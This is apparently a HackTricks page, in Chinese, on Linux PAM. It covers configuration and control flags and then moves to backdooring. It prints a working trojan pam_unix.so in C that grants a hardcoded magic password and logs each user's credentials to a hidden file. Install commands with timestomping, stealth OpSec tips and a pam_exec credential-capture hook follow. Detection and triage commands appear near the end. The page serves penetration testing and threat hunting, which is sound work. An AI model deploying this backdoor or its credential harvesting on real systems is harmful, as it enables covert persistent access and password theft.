# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### 基本信息

**PAM (Pluggable Authentication Modules)** 是一种安全机制，用于**验证尝试访问计算机服务的用户身份**，并根据各种条件控制其访问权限。它就像一个数字门卫，确保只有授权用户才能使用特定服务，同时还可能限制他们的使用量，以防止系统过载。

#### 配置文件

- **Solaris** 支持旧式中央配置文件 `/etc/pam.conf`，但当前的指南更推荐使用 `/etc/pam.d` 下的服务配置文件。<sup>[[10]](#references)</sup>
- **Linux 系统** 更倾向于采用目录方式，将特定服务的配置存放在 `/etc/pam.d` 中。例如，login 服务的配置文件位于 `/etc/pam.d/login`。<sup>[[1]](#references)</sup>

login 服务的 PAM 配置示例如下：

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **PAM 管理领域**

这些领域或管理组包括 **auth**、**account**、**password** 和 **session**，分别负责身份验证和会话管理过程的不同方面：<sup>[[1]](#references)</sup>

- **Auth**：验证用户身份，通常会提示输入密码。
- **Account**：处理账户验证，检查组成员身份或时段限制等条件。
- **Password**：管理密码更新，包括复杂度检查或防止字典攻击。
- **Session**：管理服务会话开始或结束时执行的操作，例如挂载目录或设置资源限制。

#### **PAM 模块控制标志**

控制标志决定模块在成功或失败时的响应，并影响整个身份验证过程，包括：<sup>[[1]](#references)</sup>

- **Required**：必需模块失败会导致最终失败，但只有在检查完所有后续模块后才会失败。
- **Requisite**：失败时立即终止流程。
- **Sufficient**：如果之前没有 `required` 模块失败，则成功后立即返回，并跳过同一管理组中的其余模块。
- **Optional**：只有当它是堆栈中的唯一模块时，才会导致失败。

#### 重要的攻击语义

分析或修改 PAM 时，**插入规则的位置**决定了哪个 stack 会加载它：<sup>[[1]](#references)[[13]](#references)</sup>

- `include` 和 `substack` 会从其他文件引入规则，因此编辑 `sshd` 可能只影响 SSH，而编辑 `system-auth`、`common-auth` 或其他共享 stack 则可能同时影响多个服务。<sup>[[1]](#references)[[13]](#references)</sup>
- PAM 还支持方括号括起来的控制标志，例如 `[success=1 default=ignore]`。攻击者可以滥用这些标志，在自定义检查成功后**跳过一个或多个模块**，而不必显眼地替换 `pam_unix.so`。<sup>[[1]](#references)</sup>
- `module-path` 可以是**绝对路径**（`/usr/lib/security/pam_custom.so`），也可以相对于默认 PAM 模块目录。在现代 Linux 系统上，实际目录通常是 `/lib/security`、`/lib64/security`、`/usr/lib/security`，或 `/usr/lib/x86_64-linux-gnu/security` 这样的 multiarch 路径。<sup>[[1]](#references)[[14]](#references)</sup>

给 operator 的快速提示：修补前务必梳理**完整的服务调用关系**。例如，某些发行版上的 `sshd -> password-auth -> system-auth`，或其他发行版上的 `sshd -> system-remote-login -> system-login -> system-auth`，意味着同一行 implant 可能影响远超预期的范围。<sup>[[1]](#references)[[13]](#references)</sup>

自定义 `auth` 模块可能会在账户密码之后，向 `sudo` 添加交互式验证。手动检查验证流程前，应检查生效的 `/etc/pam.d/sudo` stack、所包含的策略、模块参数，以及任何被引用的本地数据文件的权限。仅有可读的 challenge 单词列表既不能绕过密码检查，也不会创建 sudoers 授权。要完成特权切换，仍需通过正确的账户验证、完成所有必需的 PAM 步骤，并具备允许提权的 sudo 规则；无人值守的枚举不应触发该 challenge。

对于旧版 Ubuntu 的 [`pam_motd` 所有权漏洞 (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832)，应检查实际的 `libpam-modules` build，以及登录服务是否调用了受影响的 session 模块。Ubuntu 分别在 9.10 的 **1.1.0-2ubuntu1.1** 和 10.04 LTS 的 **1.1.1-2ubuntu5** 中修复了该漏洞；其他发行版或供应商的 backport 需要单独评估相应软件包。据报告，利用该漏洞需要调用者将其 home 目录下的 `.cache` 替换为 symlink，然后触发 PAM 登录，从而导致旧模块更改受保护目标的所有权。仅有 `.cache` 条目、`pam_motd.so` 配置行或旧内核版本，并不能证明系统存在风险；在被动枚举期间，不要替换文件或发起登录，而应检查 home 目录控制权限、生效的模块版本、登录可达性、symlink 处理方式和目标权限。参见 [Ubuntu 的安全公告](https://ubuntu.com/security/notices/USN-959-1)。

#### 示例场景

在包含多个 auth 模块的设置中，流程会严格按顺序执行。如果 `pam_securetty` 模块发现登录终端未获授权，就会阻止 root 登录，但由于其状态为 "required"，所有模块仍会继续处理。`pam_env` 会设置环境变量，可能有助于提升用户体验。`pam_ldap` 和 `pam_unix` 模块协同验证用户身份；`pam_unix` 会尝试使用先前提供的密码，从而提高身份验证方式的效率和灵活性。<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## 服务 stack 中的 `pam_permit`

`pam_permit.so` 会让 PAM 检查返回成功。如果低权限用户能够修改服务生效的 PAM 策略，并插入一个能短路身份验证 stack 的模块及其控制标志，就可以移除该服务的密码检查。对于 `sudo`，在判断哪些服务会受到影响前，应检查 `/etc/pam.d/sudo` 以及其中包含的任何 `common-auth` 或 `system-auth` 文件。PAM 身份验证绕过**不会**授予新的 sudoers 规则；用户仍必须获准运行请求的命令。应检查规则顺序和之前是否有 `required` 模块失败，而不要假定单独一行 `sufficient pam_permit.so` 总能成功。

## Backdooring PAM – Hooking `pam_unix.so`

在高价值 Linux 环境中，一种经典的持久化技巧是**用 trojanised drop-in 替换合法的 PAM 库**。在 PAM stack 加载 `pam_unix.so` 的主机上，SSH 或控制台身份验证可以调用其 `pam_sm_authenticate()` 入口点；恶意替代品可以窃取凭据，或实现 *magic* 密码绕过。<sup>[[2]](#references)[[11]](#references)</sup>

### 编译速查表
下面的示例使用 Linux-PAM 的 `pam_sm_authenticate()` 服务入口点和 `pam_get_authtok()` 来访问身份验证令牌。<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>示例 `pam_unix.so` trojan</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

编译并进行隐蔽替换（Unit 42 记录了替换/timestomp 模式）。将 wrapper 中硬编码的备份路径以及下方的命令都调整为目标实际的 PAM 模块目录：<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### OpSec 提示
1. **原子覆盖** – 将完整的库写入临时文件，再重命名到目标位置，避免留下只写入一部分的身份验证模块。
2. Unit 42 对 AuthDoor 的分析中发现了 `/usr/bin/.dbus.log` 这样的路径，因此它也是一个有用的 hunting 指标。<sup>[[2]](#references)</sup>
3. 保留 PAM stack 预期的入口点（例如 `pam_sm_authenticate` 和 `pam_sm_setcred`），以确保其他管理操作继续正常工作。<sup>[[11]](#references)[[18]](#references)</sup>

### 检测
对于软件包完整性检查，RPM 会验证已安装文件的元数据，`debsums -s` 会报告校验和错误，而 triage 代码块中的 `dpkg -S` 会查询软件包归属；audit watch 语法则会记录对路径的写入和属性变更。<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* 将 `pam_unix.so` 的 MD5/SHA256 值与发行版软件包进行比对。
* 使用 `rpm -V pam` 或 `debsums -s libpam-modules` 查找被替换的库，无需手动计算哈希。
* 检查 `/lib/security/` 下是否存在任何用户可写的文件或异常所有权。
* `auditd` 规则：`-w /lib/security/pam_unix.so -p wa -k pam-backdoor`。
* 在 PAM 配置中搜索意外模块：`grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`。

这个 `pam_` grep 会漏掉 basename 不同的自定义模块。检查 `/etc/pam.d` 中**生效的** `auth`、`account`、`password` 和 `session` 行（以及在使用时检查 `/etc/pam.conf`），包括它们的 control flag 和任何被包含的 stack。若一个陌生模块以 `auth sufficient` 的形式放在正常密码检查之前，应检查其软件包归属和二进制文件；[PAM 的 control 语法](https://man7.org/linux/man-pages/man5/pam.d.5.html)可能允许成功后提前结束该部分 stack。仅凭模块名称、异常时间戳或 `nodelay` 选项，并不能证明存在 bypass。如果行为显示可能存在 timing leak，应先检查实现和服务可达性；常规枚举不应反复提交身份验证猜测。

### 快速 triage 命令（入侵后或威胁 hunting）
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### 利用 `pam_exec` 实现持久化
相比替换 `pam_unix.so`，更轻量的做法是在 `/etc/pam.d/sshd` 中追加一行 `pam_exec`，这样，任何执行到该 PAM 行的调用都会运行一个辅助程序，同时保留正常的模块堆栈不变。<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` 会通过环境变量接收 PAM 元数据，例如 `PAM_USER`、`PAM_RHOST`、`PAM_SERVICE`、`PAM_TTY` 和 `PAM_TYPE`。使用 `expose_authtok` 时，helper 可以在 `auth` 或 `password` 阶段从 `stdin` 读取最多 `PAM_MAX_RESP_SIZE` 字节的密码。如果希望 helper 使用有效 UID 而非真实 UID 运行，请添加 `seteuid`。<sup>[[4]](#references)</sup>

以下实用说明基于 `pam_exec` 文档中的模块类型和 `type=` 过滤器：<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` 更适合用于**登录后操作**，例如重新打开 socket 或启动脱离终端的 daemon。
- `auth optional pam_exec.so quiet expose_authtok ...` 通常用于**凭据捕获**，因为它会在 session 打开前运行。
- 可以使用 `type=session` 或 `type=auth` 将执行限制在特定的 PAM 阶段，以避免重复执行并产生多余输出。

进行权限审查时，如果当前用户可写某个绝对路径下的 `pam_exec.so` helper，即使该文件标记为 append-only（`a`），它也值得进一步检查：[该属性允许追加内容](https://man7.org/linux/man-pages/man1/chattr.1.html)，这可能足以改变 shell script 后续的行为。首先确认 PAM 服务和事件确实会执行到该行、helper 及其父路径可信，并且命令以权限更高的身份运行；[`seteuid` 会改变使用哪个 PAM UID](https://man7.org/linux/man-pages/man8/pam_exec.8.html)。仅凭文件可写或 `lsattr` 的结果，不能证明它会以特权身份执行。

### 在发行版工具干预下保持持久性：`authselect`

在使用 `authselect` 的 RHEL 和 Fedora 系统中，直接修改 `/etc/pam.d/system-auth` 或 `/etc/pam.d/password-auth` 等生成的文件，可能会被 **`authselect` 覆盖**。为了保持持久性，管理员通常会修改 `/etc/authselect/custom/<profile>/` 下当前启用的自定义 profile，然后重新选择该 profile。<sup>[[5]](#references)[[19]](#references)</sup>

拥有 root 权限时的典型工作流程：<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

无论是用于 offense 还是 triage，这一点都很重要：如果 `/etc/pam.d/system-auth` 中包含横幅 `Generated by authselect` 和 `Do not modify this file manually`，那么真正的 persistence 点可能位于 `/etc/authselect/custom/`，而不是 `/etc/pam.d/`。<sup>[[5]](#references)</sup>

### 近期在野观察到的 tradecraft

2025 年近期关于 **Plague** Linux backdoor 的报告显示，同一核心思路被进一步扩展：恶意 PAM component 带有**静态 bypass 密码**，并会清理与 SSH 相关的环境变量和 shell history（`HISTFILE=/dev/null`），以减少登录后的 session 痕迹。<sup>[[3]](#references)</sup> 这是一个有用的 hunting 模式，因为 backdoor 逻辑可能位于 PAM 中，而 stealth artifacts 只会在 authentication 成功**之后**出现。


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM 手册](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [隐蔽行动者手册：渗透全球电信网络 - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague：新发现的基于 PAM 的 Linux backdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM 手册](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [使用 authselect 配置用户 authentication - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian 手册页](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian 手册页](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [管理 Oracle Solaris 11.4 中的 Authentication](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM 手册](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM 手册](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [系统级 Authentication 指南 - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu 软件包文件列表：libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM 手册](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM 手册](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian 手册页](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM 手册](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [变更/强制使用 Authselect - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
